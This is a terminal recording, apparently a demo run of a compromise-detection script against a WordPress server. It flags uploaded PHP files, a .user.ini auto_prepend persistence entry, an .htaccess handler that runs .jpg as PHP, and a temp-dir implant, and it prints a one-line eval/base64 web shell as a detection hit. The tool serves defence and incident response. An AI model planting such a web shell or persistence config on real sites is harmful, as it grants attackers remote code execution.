[17.14, "o", "\u001b[1m== 4. Files ==\u001b[0m\r"]
[17.2, "o", "\r\n"]
[17.26, "o", "\r"]
[17.32, "o", "\r\n"]
[17.38, "o", "  \u001b[1m/var/www/html\u001b[0m (wordpress)\r"]
[17.44, "o", "\r\n"]
[17.79, "o", "  \u001b[31m[FLAG]\u001b[0m executable PHP in a data/upload location (/var/www/html/wp-content/uploads):\r"]
[17.85, "o", "\r\n"]
[17.91, "o", "         /var/www/html/wp-content/uploads/2026/10/thumb.php\r"]
[17.97, "o", "\r\n"]
[18.03, "o", "         /var/www/html/wp-content/uploads/2026/10/.cache.php\r"]
[18.09, "o", "\r\n"]
[18.44, "o", "  \u001b[31m[FLAG]\u001b[0m auto_prepend/append_file set in a per-directory config (classic persistence):\r"]
[18.5, "o", "\r\n"]
[18.56, "o", "         /var/www/html/.user.ini:1:auto_prepend_file=/tmp/.demo.php\r"]
[18.62, "o", "\r\n"]
[18.68, "o", "  \u001b[33m[warn]\u001b[0m handler mappings that may execute non-.php files as PHP (review):\r"]
[18.74, "o", "\r\n"]
[18.8, "o", "         /var/www/html/wp-content/uploads/.htaccess:1:AddHandler application/x-httpd-php .jpg\r"]
[18.86, "o", "\r\n"]
[19.21, "o", "  \u001b[31m[FLAG]\u001b[0m web-shell-like code (read each hit; vendored libraries can false-positive):\r"]
[19.27, "o", "\r\n"]
[19.33, "o", "         /var/www/html/wp-content/uploads/2026/10/thumb.php:1:<?php @eval(base64_decode($_POST[\"demo\"]));\r"]
[19.39, "o", "\r\n"]
[19.45, "o", "  \u001b[33m[warn]\u001b[0m hidden or double-extension PHP files:\r"]
[19.51, "o", "\r\n"]
[19.57, "o", "         /var/www/html/wp-content/uploads/2026/10/.cache.php\r"]
[19.63, "o", "\r\n"]
[19.69, "o", "  \u001b[34m[info]\u001b[0m 2 PHP file(s) modified since 2026-10-01. Expected after a deploy or upgrade; otherwise review.\r"]
[19.75, "o", "\r\n"]
[19.81, "o", "  \u001b[34m[info]\u001b[0m newest 10:\r"]
[19.87, "o", "\r\n"]
[19.93, "o", "         2026-10-22 16:23  /var/www/html/wp-content/uploads/2026/10/thumb.php\r"]
[19.99, "o", "\r\n"]
[20.05, "o", "         2026-10-22 16:23  /var/www/html/wp-content/uploads/2026/10/.cache.php\r"]
[20.11, "o", "\r\n"]
[20.17, "o", "  \u001b[34m[info]\u001b[0m run deliberately, as the site user: wp core verify-checksums; wp plugin verify-checksums --all;\r"]
[20.23, "o", "\r\n"]
[20.29, "o", "  \u001b[34m[info]\u001b[0m   wp user list --role=administrator --fields=ID,user_login,user_registered\r"]
[20.35, "o", "\r\n"]
[20.41, "o", "\r"]
[20.47, "o", "\r\n"]
[21.07, "o", "\u001b[1m== 5. System ==\u001b[0m\r"]
[21.13, "o", "\r\n"]
[21.19, "o", "  \u001b[32m[ ok ]\u001b[0m no shells or network tools running as the web user (uids: 65534)\r"]
[21.25, "o", "\r\n"]
[21.31, "o", "  \u001b[34m[info]\u001b[0m ss not available; established connections not listed\r"]
[21.37, "o", "\r\n"]
[21.43, "o", "  \u001b[32m[ ok ]\u001b[0m no cron, account, sudoers or ld.so.preload changes since 2026-10-01\r"]
[21.49, "o", "\r\n"]
[21.55, "o", "  \u001b[33m[warn]\u001b[0m executable files in temp directories:\r"]
[21.61, "o", "\r\n"]
[21.67, "o", "         -rwxr-xr-x    1 root     root            20 Oct 22 16:23 /tmp/.demo-implant\r"]
[21.73, "o", "\r\n"]
[21.79, "o", "\r"]
[21.85, "o", "\r\n"]
[22.45, "o", "\u001b[1m== Verdict ==\u001b[0m\r"]
[22.51, "o", "\r\n"]
[22.57, "o", "  \u001b[31m\u001b[1m6 flag(s), 8 warning(s).\u001b[0m\r"]
[22.63, "o", "\r\n"]
[22.69, "o", "  Treat this system as suspect until each FLAG is explained. Patching does not\r"]
[22.75, "o", "\r\n"]
[22.81, "o", "  undo a compromise: preserve logs, then rotate secrets the PHP workers could read\r"]
[22.87, "o", "\r\n"]
[22.93, "o", "  (app keys, database and API credentials, session secrets, TLS keys).\r"]
[22.99, "o", "\r\n"]
[23.05, "o", "  Limits: memory disclosure leaves almost nothing on disk; redeployed containers\r"]
[23.11, "o", "\r\n"]
[23.17, "o", "  lose their history; an attacker with root could hide from any on-host check.\r"]
[23.23, "o", "\r\n"]
[23.73, "o", "\u001b[1;32m$\u001b[0m "]
